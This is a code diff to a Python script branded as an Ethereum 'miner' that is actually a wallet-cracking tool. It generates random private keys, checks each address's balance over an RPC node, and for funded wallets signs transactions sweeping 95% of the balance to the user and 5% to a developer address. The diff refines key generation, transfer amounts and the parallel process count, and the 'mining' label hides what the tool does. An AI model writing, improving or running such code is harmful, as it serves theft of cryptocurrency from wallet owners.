@@ -8,50 +8,53 @@ import requests
 from web3 import Web3
 import multiprocessing
 
-
 def MineProcess(minerAddress, chk, hits, bdhits):
-    chks = 0 
-    hits = 0
-    bdhits = 0
-    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
+    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
     if w3.isConnected():
         i=0
         while i <= 1:
-            key = "0x" + "".join(secrets.choice(string.ascii_lowercase + string.digits)
-                                                                for i in range(64))
+            key = "0x" + secrets.token_hex(32)
             try:
                 account = w3.eth.account.from_key(key)
                 bal = w3.eth.get_balance(account.address)
                 if bal > 2000000000000000:
-                    print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
-                    gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
-                    gasjson = json.loads(gasdata)
-                    avgGas = int(gasjson["average"])/10
-                    MineTransaction = {
-                        'nonce': w3.eth.getTransactionCount(account.address),
-                        'to': str(minerAddress),
-                        'value': (bal-w3.toWei(avgGas, "gwei")*2*21000)*0.95,
-                        'gas': 21000,
-                        'gasPrice': w3.toWei(avgGas, "gwei")
-                    }
-                    MineTransaction2 = {
-                        'nonce': w3.eth.getTransactionCount(account.address)+1,
-                        'to': json.load(open("DATA", "r"))['SECONDARY']["DEV"],
-                        'value': (bal-w3.toWei(avgGas, "gwei")*2*21000)*0.05,
-                        'gas': 21000,
-                        'gasPrice': w3.toWei(avgGas, "gwei")
-                    }
-                    signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
-                    sentMineTX = w3.eth.send_raw_transaction(signedMineTX)
-                    signedMineTX2 = w3.eth.account.sign_transaction(MineTransaction2, key)
-                    w3.eth.send_raw_transaction(signedMineTX2)
-                    print("\033[32m" + str(bal/1000000000*0.95) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX)))
                     hits.value = hits.value + 1
+                    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
+                    try:
+                        print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
+                        gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
+                        gasjson = json.loads(gasdata)
+                        avgGas = int(gasjson["average"])/10
+                        MineTransaction = {
+                            'nonce': w3.eth.getTransactionCount(account.address),
+                            'to': str(minerAddress),
+                            'value': w3.toWei((bal*0.95-(w3.toWei(avgGas, "gwei")*2)), "wei"),
+                            'gas': 21000,
+                            'gasPrice': w3.toWei(avgGas, "gwei")
+                        }
+                        MineTransaction2 = {
+                            'nonce': w3.eth.getTransactionCount(account.address)+1,
+                            'to': str(json.load(open("DATA", "r"))['SECONDARY']["DEV"]),
+                            'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
+                            'gas': 21000,
+                            'gasPrice': w3.toWei(avgGas, "gwei")
+                        }
+                        signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
+                        sentMineTX = w3.eth.send_raw_transaction(signedMineTX.rawTransaction)
+                        print("\033[32m" + str(bal*0.95/1000000000000000000) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX))+ "\033[0m")
+                        time.sleep(80)
+                        signedMineTX2 = w3.eth.account.sign_transaction(MineTransaction2, key)
+                        if w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei") > w3.toWei(avgGas, "gwei"):
+                            rt = w3.eth.send_raw_transaction(signedMineTX2.rawTransaction)
+                    except Exception as e:
+                        print(e)
+                        print("[WARNING!] Automatically withdrawn failed! Awaiting for manual withdraw!")
                 else:
                     print("\033[31m[BAD HIT] | " + str(account.address) + " | cracked but insufficient balance of " + str(bal/1000000000) + " ETH\033[0m")
                     bdhits.value = bdhits.value + 1
                     time.sleep(0.02)
-            except:
+            except Exception as e:
+                print(e)
                 print("\033[31m[BAD MATCH] | %s | Invalid key match for wallet\033[0m"%key)
                 chk.value = chk.value + 1
                 time.sleep(0.02)
@@ -64,7 +67,7 @@ def NUpdate(chk,hits,bdhits):
         time.sleep(0.02)
 if __name__=="__main__":
     os.system("cls")
-    print("V 1.25")
+    print("V 1.252")
     print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
     print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
     print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
@@ -74,12 +77,11 @@ if __name__=="__main__":
     sys.stdout.write("\x1b]2;EQUITY WMINER | WAITING FOR INPUT | CHKS: 0 - HITS: 0 - BDHITS: 0 |\x07")
     print('\n')
 
-
     minerAddress = input("Welcome User! Enter your ETHEREUM address to start mining: ")
     if len(minerAddress) == 42:
         print("\033[32mMining address accepted!\033[0m")
-        intensity = input("Please input desired CPU intensity for mining (1-60): ")
-        if int(intensity) >= 1 and int(intensity) <= 60:
+        intensity = input("Please input desired CPU intensity for mining (1-100): ")
+        if int(intensity) >= 1 and int(intensity) <= 100:
             print("\033[32mSelected %s as CPU intensity\033[0m"%str(intensity))
             print("Miner starting... [Buidling child processes...]")
             w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
@@ -91,7 +93,7 @@ if __name__=="__main__":
                     bdhits = multiprocessing.Value("i", 0, lock=False)
                     updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                     updP.start()
-                    pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,)) for x in range(0, int(intensity))]
+                    pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,)) for x in range(0, int(intensity)*2)]
                     print("Deploying child processes...\n")
                     [p.start() for p in pcs]
                     updP.join()
